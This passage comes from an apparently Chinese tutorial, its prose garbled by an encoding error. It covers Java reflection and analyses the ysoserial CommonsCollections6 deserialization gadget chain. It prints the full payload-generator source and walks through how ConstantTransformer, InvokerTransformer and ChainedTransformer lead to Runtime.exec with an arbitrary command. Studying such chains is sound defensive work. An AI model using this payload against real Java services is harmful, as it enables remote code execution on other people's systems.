<p>Methodç±»ä¸­æœ‰ä¸€ä¸ªinvokeæ–¹æ³•ï¼Œå°±æ˜¯ç”¨æ¥è°ƒç”¨ç‰¹å®šæ–¹æ³•çš„ï¼Œç”¨æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj, Object... args)</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è°ƒç”¨è¯¥æ–¹æ³•çš„å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼Œæ˜¯è¿™ä¸ªæ–¹æ³•çš„éœ€è¦ä¼ å…¥çš„å‚æ•°</p>
<p>testUser</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testUser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">user</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">User</span>()).getClass();</span><br><span class="line">        <span class="comment">//ç¬¬äºŒä¸ªå‚æ•°è¦ä¼ classç±»ï¼Œå¦‚æœå‚æ•°æœ‰å¤šä¸ªä¼ å…¥ï¼šnew Class[]&#123;String.class,String.class&#125; </span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">test</span> <span class="operator">=</span> user.getMethod(<span class="string">&quot;test&quot;</span>,String.class);</span><br><span class="line">        <span class="comment">//å¦‚æœç¬¬äºŒä¸ªå‚æ•°æœ‰å¤šä¸ªä¼ å…¥ï¼šnew Object[]&#123;&quot;1&quot;,&quot;2&quot;&#125;</span></span><br><span class="line">        test.invoke((<span class="keyword">new</span> <span class="title class_">User</span>()),<span class="string">&quot;liangBan&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="image-20221129140628374"><a class="header-anchor" href="#image-20221129140628374">Â¶</a><img src="https://static.sechelper.com/img/2022/11/30/0a370e8e9eba1c2a4529b7578d77d6f0.png" alt="image-20221129140628374"></h4>
<h3 id="ä¿®æ”¹å˜é‡"><a class="header-anchor" href="#ä¿®æ”¹å˜é‡">Â¶</a>ä¿®æ”¹å˜é‡</h3>
<p>User</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> <span class="string">&quot;123321&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;pass=&#x27;&quot;</span> + pass + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>testUser</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testUser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">user</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">User</span>()).getClass();</span><br><span class="line">        <span class="comment">//è·å–ç§æœ‰å±æ€§å¯¹è±¡</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">pass</span> <span class="operator">=</span> user.getDeclaredField(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">        <span class="comment">//å…³é—­javaè®¿é—®æ§åˆ¶æ£€æŸ¥ï¼Œå°±å¯ä»¥ç»™privateå±æ€§èµ‹å€¼è°ƒç”¨</span></span><br><span class="line">        pass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">		System.out.println(u);</span><br><span class="line">        pass.set(u,<span class="string">&quot;liangban&quot;</span>);</span><br><span class="line">        System.out.println(u);</span><br><span class="line">        System.out.println(pass.get(u));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="å¸¸ç”¨æ–¹æ³•"><a class="header-anchor" href="#å¸¸ç”¨æ–¹æ³•">Â¶</a>å¸¸ç”¨æ–¹æ³•</h3>
<p>è·å–ç±»:forName / getClass</p>
<p>è·å–ç±»ä¸‹çš„å‡½æ•°: getMethod/s / getDeclaredMethod/s</p>
<p>æ‰§è¡Œç±»ä¸‹çš„å‡½æ•°: invoke</p>
<p>è·å–ç±»æ„é€ æ–¹æ³•: getConstructor/s / getDeclaredConstructor/s</p>
<h2 id="CCé“¾æºç åˆ†æ"><a class="header-anchor" href="#CCé“¾æºç åˆ†æ">Â¶</a>CCé“¾æºç åˆ†æ</h2>
<p>æˆ‘ä»¬éœ€è¦payloadç»è¿‡ååºåˆ—åŒ–è¿‡åä¼šæ‰§è¡Œï¼š<code>Runtime.getRuntime().exec(&quot;ä»»æ„å‘½ä»¤&quot;)</code></p>
<p>CommonsCollections6.java åœ¨\ysoserial\src\main\java\ysoserial\payloads\CommonsCollections6.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MATTHIASKAISER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Serializable&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Serializable <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innimpl</span> <span class="operator">=</span> (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f2);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(keyField);</span><br><span class="line">        keyField.set(node, entry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PayloadRunner.run(CommonsCollections6.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­æˆ‘ä»¬å…ˆçœ‹è¿™é‡Œï¼Œæ˜¯æ•´ä¸ªæ¼æ´çš„æ ¸å¿ƒï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸ªå‡½æ•°çš„çœ‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>
<p>è·Ÿè¿›ConstantTransformerçœ‹ä¸€ä¸‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6374440726369055124L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">NULL_INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>((Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title function_">getInstance</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (Transformer)(constantToReturn == <span class="literal">null</span> ? NULL_INSTANCE : <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(constantToReturn));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getConstant</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å®ƒçš„transformæ–¹æ³•ä¼šè¿”å›iConstantï¼Œè€Œthis.iConstantæ˜¯æ¥è‡ªæ„é€ å™¨å‚æ•°constantToReturnï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å®ä¾‹åŒ–æ—¶ä¼ å…¥ä¸€ä¸ªRuntime.classè¿”å›çš„ä¹Ÿæ˜¯Runtime.classå°±è§£å†³äº†<code>Runtime.getRuntime().exec(&quot;ä»»æ„å‘½ä»¤&quot;)</code>å¼€å¤´æˆ‘ä»¬éœ€è¦çš„Runtimeç±»</p>
<p>å†è·Ÿè¿›InvokerTransformerçœ‹ä¸€ä¸‹å®ç°äº†ä»€ä¹ˆï¼Œè¿™é‡Œåªå±•ç¤ºéœ€è¦çš„ä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">æ„é€ æ–¹æ³•</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">transformæ–¹æ³•</span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var6);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨å‰é¢è¯´åˆ°äº†åå°„æœºåˆ¶ï¼Œè¿™é‡Œçš„transformå¾ˆæ˜æ˜¾å°±æ˜¯åˆ©ç”¨äº†åå°„æœºåˆ¶ï¼Œæ˜¯æ‰§è¡Œäº†æŸä¸ªå¯¹è±¡çš„æŸä¸ªæ–¹æ³•</p>
<p>ä½¿ç”¨çš„this.iMethodNameï¼Œthis.iParamTypesï¼Œthis.iArgséƒ½æ˜¯å¯ä»¥é€šè¿‡æ„é€ æ–¹æ³•ä¼ å…¥çš„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œé‚£ä¹ˆåªè¦inputå¯æ§ï¼Œå°±å¯ä»¥æ‰§è¡Œä»»æ„å¯¹è±¡çš„ä»»æ„æ–¹æ³•ï¼Œè¿™é‡Œå°±è¦çœ‹åˆ°ChainedTransformerç±»äº†</p>
<p>ChainedTransformer</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//æ„é€ æ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//transformæ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªç±»çš„æ„é€ å‡½æ•°æ¥æ”¶ä¸€ä¸ªTransformerç±»å‹çš„æ•°ç»„ï¼Œå¹¶ä¸”åœ¨transformæ–¹æ³•ä¸­ä¼šéå†è¿™ä¸ªæ•°ç»„ï¼Œå¹¶è°ƒç”¨æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªæˆå‘˜çš„transformæ–¹æ³•ï¼Œè€Œä¸”ä¼šæŠŠä¸Šä¸€ä¸ªæˆå‘˜è°ƒç”¨transformçš„æ–¹æ³•è¿”å›çš„å¯¹è±¡ï¼Œå½“ä½œä¸‹ä¸€ä¸ªæˆå‘˜çš„transformæ–¹æ³•çš„å‚æ•°ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªé“¾å¼è°ƒç”¨ï¼Œé…åˆInvokerTransformerç±»ä¸­çš„transformæ–¹æ³•ï¼Œinputä¹Ÿå¯æ§äº†</p>
<p>è‡³æ­¤æ•´ä¸ªæ¼æ´æ ¸å¿ƒå·²ç»æ˜äº†ï¼Œåˆ©ç”¨ConstantTransformerçš„transformæ–¹æ³•è·å–Runtime.classï¼Œå†åˆ©ç”¨ChainedTransformerçš„transformæ–¹æ³•æŠŠRuntime.classä¼ ç»™InvokerTransformerçš„transformæ–¹æ³•åˆ©ç”¨ï¼Œå†åˆ©ç”¨ChainedTransformerçš„transformæ–¹æ³•ä¸æ–­è°ƒç”¨InvokerTransformerçš„transformæ–¹æ³•ï¼Œåˆ©ç”¨è¿™ä¸ªæ–¹æ³•çš„åå°„ç›¸å…³ä»£ç ï¼Œæ‰€æœ‰å‚æ•°éƒ½æ˜¯å¯æ§çš„ã€‚</p>
<p>å¯èƒ½æœ‰ç‚¹æ™•ï¼Œè¿™ä¸‰ä¸ªXXXtransformerç±»éƒ½æ˜¯å®ç°äº†TransFormerè¿™ä¸ªæ¥å£ï¼Œæ‰€ä»¥ä»–ä»¬éƒ½æœ‰ä¸€ä¸ªtransformæ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer ï¼štransformæ–¹æ³•é€šè¿‡åå°„å¯ä»¥æ‰§è¡Œä¸€ä¸ªå¯¹è±¡çš„ä»»æ„æ–¹æ³•</span><br><span class="line"></span><br><span class="line">ConstantTransformer ï¼š transformè¿”å›æ„é€ å‡½æ•°ä¼ å…¥çš„å‚æ•°</span><br><span class="line"></span><br><span class="line">ChainedTransformer ï¼štransformæ–¹æ³•æ‰§è¡Œæ„é€ å‡½æ•°ä¼ å…¥æ•°ç»„çš„æ¯ä¸€ä¸ªæˆå‘˜çš„transformæ–¹æ³•</span><br></pre></td></tr></table></figure>
